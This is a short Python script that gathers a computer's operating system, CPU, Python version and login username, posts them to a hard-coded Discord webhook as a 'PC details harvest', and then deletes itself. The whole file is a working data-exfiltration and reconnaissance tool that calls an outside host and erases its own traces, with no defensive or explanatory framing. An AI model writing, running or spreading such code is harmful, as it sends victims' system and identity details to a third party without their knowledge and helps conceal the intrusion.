from datetime import datetime
import platform
import requests
import tempfile
import time
import sys
import os

def main() -> None:
    # ASCII title
    title = """
█████▄ ▄█████ ████▄  ██████ ██████ ▄████▄ ██ ██     ▄█████ 
██▄▄█▀ ██     ██  ██ ██▄▄     ██   ██▄▄██ ██ ██     ▀▀▀▄▄▄ 
██     ▀█████ ████▀  ██▄▄▄▄   ██   ██  ██ ██ ██████ █████▀"""

    # declare discord api server
    API_URL = "https://discord.com/api/webhooks/1456756375722922189/nd6mCxBhCyrlQ305MWqFlPTGKx_AEV0yEfEFoPRUar4uHOoComIUFckjt_ZvuCNwe7aQ"
    
    # declare temp file path
    pc_details_file_path = os.path.join(tempfile.gettempdir(), "pc_details.txt")

    # PC details information
    pc_os = sys.platform
    pc_os_details = platform.system()
    pc_os_version = platform.release()
    pc_os_version_details = platform.version()
    pc_cpu_arc = platform.machine()
    pc_cpu_arc_mode = platform.architecture()
    pc_cpu_model = platform.processor()
    
    if pc_cpu_model is None or pc_cpu_model == "":
        pc_cpu_model = "couldn't able to get CPU info"

    pc_py_version = platform.python_version()
    pc_py_version_details = sys.version
    username = os.getlogin()

    # Datetime log
    date = datetime.now()
    weekday = date.strftime("%A")
    full_date = date.strftime("%x")
    time_log = date.strftime("%X")
    full_log = f" {weekday} | {time_log} | {full_date}"

    dictionary_log = {
        "OS: ": f"{pc_os}, {pc_os_details}",
        "OS version: ": pc_os_version,
        "CPU machine: ": pc_cpu_arc,
        "CPU architecture: ": pc_cpu_arc_mode,
        "CPU model: ": pc_cpu_model,
        "Python version: ": pc_py_version,
        "Current user: ": username
    }

    # write data in the file
    with open(pc_details_file_path, "w", encoding="utf-8") as file:
        file.write(title + "\n")
        file.write("-" * 30 + "\n")
        file.write(full_log + "\n")
        file.write("-" * 30 + "\n")
    
        for key, value in dictionary_log.items():
            file.write(f"{key}{value}\n")
    
    # declare headers
    headers = { "User-Agent": "DiscordUser/1.0" }  # no Content-Type

    # declare payload
    payload = { "content": "**PC details harvest has arrived!**" }

    # send file to the server
    with open(pc_details_file_path, "rb") as file:
        files = { "file": file }
        response = requests.post(API_URL, files=files, headers=headers, data=payload)

    print(response.status_code)

    # cleanup
    def auto_delete() -> None:
        this_python_path = sys.argv[0]

        try:
            if os.path.exists(this_python_path):
                if os.path.isfile(this_python_path):
                    # auto-delete / cleanup
                    time.sleep(5)
                    # document delete
                    os.remove("pc_details.txt")
                    # auto-delete
                    os.remove(this_python_path)
                else:
                    print("This document is not a file")
            else:
                print("This file does not exist")

        except Exception as auto_delete_exception_1:
            sys.stderr.write(f"There was an error with auto_delete function: {auto_delete_exception_1}")

    # cleanup
    auto_delete()

if __name__ == "__main__":
    main()
